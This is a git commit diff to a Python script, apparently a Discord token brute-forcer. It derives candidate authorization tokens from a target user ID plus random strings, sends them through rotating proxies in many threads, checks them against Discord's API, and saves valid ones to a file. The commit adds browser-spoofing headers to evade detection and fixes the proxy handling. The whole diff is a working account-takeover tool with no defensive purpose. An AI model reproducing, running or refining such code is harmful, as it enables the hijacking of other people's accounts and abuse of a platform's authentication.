109bc99b821360c365d7187d7658453f7cc9ae3f
Loli-neko <119277638+Loli-neko@users.noreply.github.com>
2023-05-25 02:57:26 +0000

    Update headers, url, etc...

--- main.py
+++ main.py
@@ -15,7 +15,7 @@ def getproxies():
                 "http://": "http://" + proxy,
                 "https://": "https://" + proxy
             }
-            return proxy
+            return proxies
 
 def randstr(length):
     chars = '-_1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
@@ -24,7 +24,7 @@ def randstr(length):
 
 thd = int(input(f"{Fore.GREEN}[?] すれっど数 > "))
 amnt = int(input(f"{Fore.GREEN}[?] 実行回数 > "))
-usid = int(input(f"{Fore.GREEN}[?] ユーザーID > "))
+usid = input(f"{Fore.GREEN}[?] ユーザーID > ")
 base = base64.b64encode(usid.encode()).decode() + "."
 if int(usid) > 970000000000000000:
     usi = 38
@@ -35,25 +35,36 @@ def main():
     token = base + randstr(6) + "." + randstr(usi)
     client = httpx.Client(proxies=getproxies())
     headers = {
-        "content-type": "application/json",
+        "Content-Type": "application/json",
         "Accept-Encoding": "gzip, deflate",
-        "authorization": token,
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
+        "Authorization": token,
+        "Sec-Ch-Ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Sec-Ch-Ua-Platform": '"Windows"',
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
+        "X-Debug-Options": "bugReporterEnabled",
+        "X-Discord-Locale": "ja",
+        "X-Discord-Timezone":"Asia/Tokyo",
+        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImphIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEzLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE5OTkzMywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ=="
     }
     try:
-        x = client.get("https://discord.com/api/v9/users/@me/library", headers=headers)
-        if x.status_code == 200:
-            print(f"{Fore.BLUE}[+] 生存しています - {token}")
+        #res = client.get("https://discord.com/api/v9/users/@me/library?country_code=JP", headers=headers)
+        res = client.get("https://discord.com/api/v9/users/@me/library?country_code=JP", headers=headers)
+        if res.status_code == 200:
+            print(f"{Fore.BLUE}[+] Vaild token - {token}")
             with open("/validtokens.txt", "a+") as f:
                 f.write(f"{token}\n")
-        elif x.status_code == 403 and "message" in x.json():
-            print(f"{Fore.RED}[-] ロックされています - {token}")
-        elif x.status_code == 401:
-            print(f"{Fore.RED}[-] 無効なトークン - {token}")
+        elif res.status_code == 403 and "message" in res.json():
+            print(f"{Fore.RED}[-] Locked token - {token}")
+        elif res.status_code == 401:
+            print(f"{Fore.RED}[-] invaild token - {token}")
         else:
-            print(f"{Fore.RED}[-] 不明な状態 - {token}\n{x.json()}")
+            print(f"{Fore.RED}[-] Unknown token - {token}\n{res.json()}")
     except Exception as err:
-        print(f"{Fore.RED}[-] エラー: - {token}\n{err}")
+        print(f"{Fore.RED}[-] Error - {token}\n{err}")
     
 
 with ThreadPoolExecutor(max_workers=thd) as executor:
